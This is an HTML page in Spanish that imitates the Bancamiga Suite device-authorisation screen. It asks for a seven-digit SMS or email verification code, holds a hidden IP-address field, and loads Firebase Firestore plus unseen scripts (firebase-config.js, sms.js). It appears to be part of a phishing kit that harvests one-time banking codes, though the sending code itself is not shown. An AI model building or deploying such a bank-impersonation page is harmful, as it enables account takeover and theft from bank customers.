<!DOCTYPE html>
<html lang="es">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancamiga Suite - Autorización de Dispositivo</title>
    <link rel="preconnect" href="../fonts.googleapis.com/index.html">
    <link rel="preconnect" href="../fonts.gstatic.com/index.html" crossorigin="">
    <link href="midas/css2.css" rel="stylesheet">
    <link rel="shortcut icon" href="assets/favicon.ico" type=image/x-icon>
    <style>
        /* Variables de color */
        :root {
            --bancamiga-green: #84A83E;
            --bancamiga-dark-green: #2e7d32;
            --bancamiga-light-grey: #f0f2f5;
            --text-color-dark: #333;
            --text-color-light: #555;
            --input-bg: #f9f9f9;
            --border-color: #ddd;
            --main-blue-gradient-start: #007bff; /* Azul de fondo simulado */
            --main-blue-gradient-end: #0056b3; /* Azul más oscuro de fondo simulado */
            --device-auth-blue: #007bff; /* Azul principal del card */
            --device-auth-text-dark: #003366; /* Azul oscuro para textos principales */
            --device-auth-text-light: #6c757d; /* Gris para textos secundarios */
        }
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start; /* Alinea al inicio para dejar espacio para la barra superior */
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            background-color: var(--bancamiga-light-grey);
            background-image: url('assets/images/fondo_general_azul.html'); /* Fondo general azul */
            background-repeat: no-repeat;
            background-size: cover;
            background-position: center center;
            background-attachment: fixed;
            color: var(--text-color-dark);
            position: relative; /* Para la barra superior fija */
        }
        /* --- Contenedor Principal (Tarjeta de Autorización) --- */
        .auth-container {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            width: 90%;
            max-width: 450px; /* Ajustado para ser un poco más ancho que un modal típico */
            padding: 30px;
            text-align: center;
            box-sizing: border-box;
            margin-top: 80px; /* Margen superior */
            margin-bottom: 30px; /* Espacio inferior */
            position: relative;
            z-index: 10;
            overflow: hidden; /* Para contener la imagen de fondo */
        }
        /* Estilo para el fondo azul dentro del contenedor */
        .auth-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 35%; /* Altura de la sección azul superior dentro del card */
            background: linear-gradient(to bottom, #007bff, #0056b3); /* Gradiente azul similar al fondo */
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
            z-index: -1; /* Para que quede detrás del contenido */
        }
        /* Logo Bancamiga Suite dentro del card */
        .auth-logo-suite {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px; /* Espacio debajo del logo */
            color: white; /* Color del texto "Suite" */
            position: relative;
            z-index: 1; /* Para que esté sobre el fondo azul */
        }
        .auth-logo-suite img {
            height: 35px; /* Tamaño del logo */
            margin-right: 10px;
        }
        .auth-logo-suite .suite-text {
            font-size: 24px;
            font-weight: 700;
        }
        /* Títulos y textos */
        .auth-title {
            font-size: 26px;
            font-weight: 700;
            color: white; /* Blanco porque está sobre el fondo azul del card */
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
        }
        .auth-user-name {
            font-size: 18px;
            font-weight: 700;
            color: white; /* Blanco porque está sobre el fondo azul del card */
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        .auth-instruction-text {
            font-size: 15px;
            color: white; /* Blanco porque está sobre el fondo azul del card */
            margin-bottom: 50px; /* AJUSTADO: Se reduce un poco para dar más espacio a la imagen y centrarla mejor */
            line-height: 1.4;
            position: relative;
            z-index: 1;
        }
        /* Imagen central del teléfono - Ajustes para que resalte y sea más grande Y se mueva al centro */
        .phone-graphic {
            width: 250px; /* Tamaño más grande para PC/Tablets */
            height: auto;
            margin-top: -30px; /* AJUSTADO: Margen negativo para superponer con el texto y centrarlo visualmente */
            margin-bottom: 30px; /* Margen para separar de los inputs */
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); /* Sombra para que resalte */
            border-radius: 15px; /* Bordes redondeados */
            transition: transform 0.3s ease-in-out; /* Animación de hover */
        }
        .phone-graphic:hover {
            transform: scale(1.03); /* Ligeramente más grande al pasar el ratón */
        }
        /* Mensaje de "Hemos enviado el código" */
        .code-prompt {
            font-size: 16px;
            color: var(--device-auth-text-light); /* Gris claro */
            margin-top: 0px; /* AJUSTADO: Eliminado el margin-top para que se pegue más a la imagen */
            margin-bottom: 20px;
        }
        /* Campos de entrada para el código */
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px; /* Espacio entre los cuadros */
            margin-bottom: 30px;
        }
        .code-inputs input {
            width: 45px; /* Ancho de cada cuadro */
            height: 55px; /* Alto de cada cuadro */
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            outline: none; /* Elimina el contorno al enfocar */
            transition: border-color 0.3s ease;
            background-color: var(--input-bg);
            color: var(--text-color-dark);
        }
        .code-inputs input:focus {
            border-color: var(--bancamiga-green);
            box-shadow: 0 0 0 3px rgba(92, 184, 92, 0.2); /* Sombra suave al enfocar */
        }
        /* Botones */
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 3px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s ease, color 0.3s ease;
            margin-top: 15px;
        }
        .btn-verify {
            background-color: var(--bancamiga-green);
            color: white;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .btn-verify:hover {
            background-color: #4cae4c;
        }
        .btn-back {
            background-color: #e9ecef; /* Gris claro */
            color: var(--text-color-light); /* Gris oscuro para el texto */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        .btn-back:hover {
            background-color: #dee2e6;
        }
        /* Estilo para el cuadro de texto azul */
        .info-box {
            background-color: #e0f2f7; /* Un azul muy claro, casi celeste */
            color: #007bff; /* Azul vibrante */
            border: 1px solid #007bff; /* Borde azul */
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px; /* Espacio encima del cuadro de info */
            margin-bottom: 20px; /* Espacio debajo del cuadro de info */
            font-size: 14px;
            line-height: 1.5;
            text-align: left; /* Alineación del texto dentro del cuadro */
        }
        /* Estilo para el mensaje de error */
        .error-message {
            color: red;
            font-weight: bold;
            margin-top: -15px; /* Ajusta la posición para que esté justo debajo de los inputs */
            margin-bottom: 15px; /* Espacio antes del siguiente elemento */
            font-size: 15px;
        }
        /* Media queries para ajustes responsivos */
        @media (max-width: 480px) {
            .auth-container {
                padding: 20px;
                margin-top: 40px; /* Un poco menos de margen superior en móviles, para centrar mejor el contenido */
            }
            .auth-logo-suite img {
                height: 30px;
            }
            .auth-logo-suite .suite-text {
                font-size: 20px;
            }
            .auth-title {
                font-size: 22px;
            }
            .auth-user-name {
                font-size: 16px;
            }
            .auth-instruction-text {
                font-size: 14px;
                margin-bottom: 30px; /* AJUSTADO: Se reduce en móvil para centrar mejor */
            }
            .phone-graphic { /* Ajuste responsivo para la imagen central */
                width: 180px; /* Un tamaño más adecuado para móviles */
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); /* Sombra más sutil en móvil */
                margin-top: -20px; /* AJUSTADO: Margen negativo en móvil para centrar */
            }
            /* AJUSTES CLAVE PARA QUE LOS INPUTS SE VEAN COMPLETOS EN MÓVIL */
            .code-inputs {
                gap: 5px; /* Reducimos el espacio entre los inputs */
                /* ANTERIOR: flex-wrap: wrap; --> ELIMINADO PARA MANTENERLOS EN UNA SOLA LÍNEA */
                justify-content: center; /* Centrar los elementos */
            }
            .code-inputs input {
                /* Ajustar el ancho para que quepan 7 inputs con 5px de gap */
                /* (100% - (6 * 5px)) / 7 */
                width: calc((100% - 30px) / 7);
                max-width: 38px; /* Mantener un máximo para evitar que se hagan demasiado grandes */
                height: 48px; /* Ajustamos la altura */
                font-size: 20px; /* Ajustamos el tamaño de fuente */
                padding: 0; /* Aseguramos que no haya padding extra */
                margin: 0; /* Aseguramos que no haya margin extra (aunque gap lo controla) */
            }
            .btn {
                font-size: 16px;
                padding: 12px;
            }
            .info-box {
                padding: 10px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="auth-container" >
        <div class="auth-logo-suite" >
            <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Logo">
            <span class="suite-text"></span>
        </div>
        <h1 class="auth-title">Autorización de dispositivo</h1>
        <p class="auth-user-name"></p>
        <p class="auth-instruction-text">
            El código de verificación fue enviado a través de correo electrónico y número telefónico vía SMS.
        </p>
        <img src="midas/mensaje.png" alt="Teléfono con código de verificación" class="phone-graphic">
        <p class="code-prompt">Hemos enviado el código de verificación</p>
        <div id="authForm" >
          <div class="code-inputs">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
        </div>
  <div class="info-box">
     Si tienes activada la verificación en dos pasos (2FA), 
es posible que necesites ingresar un código adicional que se genera a 
través de la aplicación Google Authenticator o similar, o recibirlo por 
SMS.
  </div>
  <button type="button" class="btn btn-verify">VERIFICAR</button>
</div>
    </div>
    <input type="hidden" id="direccionIP" name="direccionIP">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <script src="js/firebase-config.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const overlay = document.getElementById('overlay');
            if (overlay) {
                overlay.style.display = 'none';
            }
        });
    </script>
    <script src="js/sms.js"></script>
</body>
</html>